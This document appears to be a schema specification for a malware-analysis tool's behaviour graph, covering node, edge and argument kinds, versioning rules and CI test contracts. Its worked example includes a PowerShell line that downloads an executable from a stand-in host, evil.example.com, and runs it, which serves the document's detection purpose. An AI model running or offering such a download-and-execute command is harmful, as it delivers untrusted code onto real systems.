# NivXRay · Behaviour Graph Schema

**Schema version:** `1.1.0`
**Frozen:** 2026-07-27
**Contract owner:** Investigation Brain (`v2/investigation/behavior/`)

The Behaviour Graph is the **canonical semantic layer** of the
Investigation Brain. Every downstream engine — Verdict Uplift,
Evidence Graph, Analyst Report, and (future) Behaviour Correlation
— speaks this vocabulary. Adding to the schema requires a
**MAJOR bump** and a supporting Trust-Corpus sample that proves the
gap. This document is the source of truth; the Python enums in
`v2/investigation/behavior/models.py` mirror it exactly and are
locked by CI.

---

## Data flow

```
Input → IU → CRE / RTE → Intent Layer → Behaviour Graph
   → Verdict Engine → Evidence Graph → Analyst Report
   → Behaviour Correlation (future)
```

---

## Versioning policy

`BEHAVIOR_GRAPH_SCHEMA_VERSION` is emitted on every serialized
`BehaviorGraph` (top-level field `schema_version`). Rules:

| Change kind                                             | Bump |
| ------------------------------------------------------- | ---- |
| Add a new `BehaviorKind`                                | MINOR |
| Add a new `BehaviorEdgeKind` or `BehaviorArgKind`       | MINOR |
| Remove or rename any kind (breaking)                    | MAJOR |
| Change the *meaning* of an existing kind                | MAJOR |
| Non-schema code changes (builders, formatters, docs)    | none |

CI enforces: whenever any enum in `behavior/models.py` gains,
loses, or renames a member, the corresponding line in
`BEHAVIOR_GRAPH_SCHEMA.md` (this file) MUST change in the same
commit and `BEHAVIOR_GRAPH_SCHEMA_VERSION` MUST bump. The
`tests/test_behavior_graph_schema_freeze.py` regression fails
otherwise.

---

## Allowed node kinds — `BehaviorKind`

Every node in the graph carries one of the following canonical
kinds. Nodes without a supporting `Evidence` object must NOT be
emitted.

| Kind                     | Meaning                                                            |
| ------------------------ | ------------------------------------------------------------------ |
| `download`               | Retrieve remote content (any downloader — IWR / curl / certutil …) |
| `write_file`             | Persist bytes to a specific filesystem destination                 |
| `execute`                | Run a local file or command                                        |
| `remote_execution`       | Execute code fetched from a remote source at runtime               |
| `network_connection`     | Deliberate outbound connection (C2 / beacon)                       |
| `registry_modification`  | Write / delete a registry value                                    |
| `process_creation`       | Spawn a subprocess                                                 |
| `persistence`            | Mechanism that survives reboot (Run key, task, service, WMI sub.)  |
| `lateral_movement`       | Credentialed remote execution / remote-management enablement (PsExec, WinRM, PSRemoting) |
| `defense_evasion`        | AMSI / ETW / Defender / firewall / logging tamper                  |
| `discovery`              | Host / user / directory / network enumeration                      |
| `credential_access`      | Extract cached, interactive, or stored credentials                 |
| `runtime_dependent`      | Final behaviour cannot be determined without runtime data          |

---

## Allowed edge kinds — `BehaviorEdgeKind`

Edges are typed so analysts can read the graph without a legend.

| Kind        | Direction     | Meaning                                                     |
| ----------- | ------------- | ----------------------------------------------------------- |
| `then`      | A → B         | B happened after A (sequential ordering)                    |
| `writes_to` | A → B         | A wrote a specific file B (`download → write_file`)         |
| `executes`  | A → B         | A spawned / invoked file B (`write_file → execute`,         |
|             |               | `remote_execution → execute`)                               |
| `targets`   | A → B         | A operates on a specific IOC / node B (e.g. persistence key)|

---

## Allowed argument kinds — `BehaviorArgKind`

Args are the concrete IOCs / references a behaviour node operates
on. Keeping them typed lets downstream consumers pivot without
re-parsing free-form strings.

| Kind        | Value example                                              |
| ----------- | ---------------------------------------------------------- |
| `url`       | `http://evil.example.com/a.exe`                            |
| `domain`    | `evil.example.com`                                         |
| `ip`        | `10.0.0.7`                                                 |
| `file`      | `a.exe` · `C:\Users\Public\a.exe` · `$env:TEMP\patch.exe`  |
| `registry`  | `HKCU:\Software\Microsoft\Windows\CurrentVersion\Run`      |
| `process`   | `powershell.exe`                                           |

---

## Canonical chain example

Input: `Invoke-WebRequest http://evil.example.com/a.exe -OutFile a.exe; Start-Process a.exe`

```
b#001  download          (args: url=…, domain=…)
   │  writes_to
   ▼
b#002  write_file        (args: file=a.exe)
   │  then                     │  executes
   ▼                            │
b#003  remote_execution        │
   │  executes                  ▼
   └──────────────────► b#004  execute (args: file=a.exe)
```

Every node cites the canonical Evidence emitted by its source
Intent. Determinism: same input → byte-identical graph → the
same `behavior_shape` slice of the `determinism_hash`.

---

## Determinism guarantees

- Given the same fired `IntentAssessment` and effective payload,
  `build()` returns a byte-identical `BehaviorGraph`.
- The `investigation.determinism_hash` folds in `behavior_shape`
  so any regression in graph layout is caught by the existing
  determinism gate.
- `BehaviorGraph.has_chain(*kinds)` is the ONLY way the Verdict
  Engine and future Correlation should ask questions about the
  graph — no ad-hoc edge walking.

---

## Trust Corpus expectations

Corpus samples can declare:

- `expected_behavior_kinds` — list of kinds that must appear.
- `expected_behavior_chain` — list of kinds that must be
  connected via typed edges in order.

Both are checked by the Trust Metrics runner and count towards
`investigation_integrity`, which is CI-locked at **100%**.

---

## Regression contract (locked)

The following tests MUST always pass:

- `tests/test_behavior_graph.py` — 15 tests locking the shape.
- `tests/test_behavior_graph_schema_freeze.py` — enforces that
  the enums stay byte-identical to this document until the schema
  version bumps.
- `tests/test_trust_metrics_gate.py::test_investigation_integrity_locked_at_100`.
